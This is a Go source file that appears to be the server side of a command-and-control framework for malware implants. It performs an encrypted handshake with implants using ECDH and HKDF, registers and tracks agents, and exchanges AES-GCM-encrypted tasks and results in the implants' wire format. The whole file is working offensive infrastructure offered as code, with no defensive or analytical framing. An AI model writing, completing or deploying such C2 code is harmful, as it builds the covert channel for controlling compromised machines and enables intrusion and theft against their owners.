package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"

	"golang.org/x/crypto/hkdf"
)

var STATIC_KEY []byte

func loadStaticKey(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	hexStr := strings.TrimSpace(string(data))
	STATIC_KEY, err = hex.DecodeString(hexStr)
	if err != nil || len(STATIC_KEY) != 32 {
		return fmt.Errorf("invalid static key: must be 32 bytes hex")
	}
	return nil
}

// --- GCM encrypt/decrypt (matches implant wire format: nonce || ciphertext+tag, b64) ---

func encryptGCM(plaintext string, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func decryptGCM(cryptoText string, key []byte) (string, error) {
	data, err := base64.StdEncoding.DecodeString(cryptoText)
	if err != nil {
		return "", err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return "", fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

// --- Handshake ---

func handleHandshake(w http.ResponseWriter, r *http.Request, agentID string) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	decrypted, err := decryptGCM(string(body), STATIC_KEY)
	if err != nil {
		log.Printf("[c2] handshake decrypt failed for %s: %v", agentID, err)
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	var task Task
	if err := json.Unmarshal([]byte(decrypted), &task); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	implantPubBytes, err := base64.StdEncoding.DecodeString(task.PublicKey)
	if err != nil {
		http.Error(w, "invalid pubkey", http.StatusBadRequest)
		return
	}

	curve := ecdh.P256()
	implantPub, err := curve.NewPublicKey(implantPubBytes)
	if err != nil {
		http.Error(w, "invalid pubkey", http.StatusBadRequest)
		return
	}

	serverPriv, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		http.Error(w, "keygen failed", http.StatusInternalServerError)
		return
	}
	serverPub := serverPriv.PublicKey()

	sharedSecret, err := serverPriv.ECDH(implantPub)
	if err != nil {
		http.Error(w, "ecdh failed", http.StatusInternalServerError)
		return
	}

	hkdfReader := hkdf.New(sha256.New, sharedSecret, nil, []byte("handshake data"))
	derivedKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, derivedKey); err != nil {
		http.Error(w, "hkdf failed", http.StatusInternalServerError)
		return
	}

	if !agentExists(agentID) {
		registerAgent(agentID)
	} else {
		heartbeatAgent(agentID)
	}
	setSessionKey(agentID, derivedKey)

	resp := HandshakeResponse{
		Status:    "ok",
		PublicKey: base64.StdEncoding.EncodeToString(serverPub.Bytes()),
	}
	respJSON, _ := json.Marshal(resp)
	encrypted, err := encryptGCM(string(respJSON), STATIC_KEY)
	if err != nil {
		http.Error(w, "encrypt failed", http.StatusInternalServerError)
		return
	}

	log.Printf("[c2] handshake complete for agent %s", agentID)
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(encrypted))
}

// --- Session helpers ---

func encryptForAgent(agentID, text string) (string, error) {
	mu.Lock()
	agent, ok := agents[agentID]
	mu.Unlock()
	if !ok {
		return "", fmt.Errorf("unknown agent %s", agentID)
	}
	return encryptGCM(text, agent.SessionKey)
}

func decryptFromAgent(agentID, cryptoText string) (string, error) {
	mu.Lock()
	agent, ok := agents[agentID]
	mu.Unlock()
	if !ok {
		return "", fmt.Errorf("unknown agent %s", agentID)
	}
	return decryptGCM(cryptoText, agent.SessionKey)
}

// --- Task/result I/O helpers ---

func readEncryptedBody(r *http.Request, agentID string) ([]byte, error) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		return nil, err
	}
	decrypted, err := decryptFromAgent(agentID, string(body))
	if err != nil {
		return nil, err
	}
	return []byte(decrypted), nil
}

func writeEncryptedResponse(w http.ResponseWriter, agentID string, data []byte) {
	encrypted, err := encryptForAgent(agentID, string(data))
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(encrypted))
}

func writeEncryptedJSON(w http.ResponseWriter, agentID string, v interface{}) {
	jsonData, err := json.Marshal(v)
	if err != nil {
		http.Error(w, "marshal error", http.StatusInternalServerError)
		return
	}
	writeEncryptedResponse(w, agentID, jsonData)
}
